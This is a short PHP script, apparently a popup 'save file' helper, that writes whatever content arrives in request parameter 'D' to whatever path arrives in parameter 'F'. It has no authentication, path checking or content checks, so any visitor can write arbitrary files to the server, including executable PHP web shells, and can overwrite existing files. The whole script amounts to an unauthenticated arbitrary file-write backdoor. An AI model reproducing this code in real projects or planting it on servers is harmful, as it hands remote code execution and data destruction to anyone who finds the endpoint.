<?php
$NAME = $_REQUEST['F'];
$HANDLE = fopen($NAME, 'w') or die ('CANT OPEN FILE');
if(fwrite($HANDLE,$_REQUEST["D"]))
 echo '<center>File Saved.<br>';
else
 echo '<center>Error In Saving...<br>';
echo 'Please Close the Popup Window...</center>'; 
fclose($HANDLE);
?>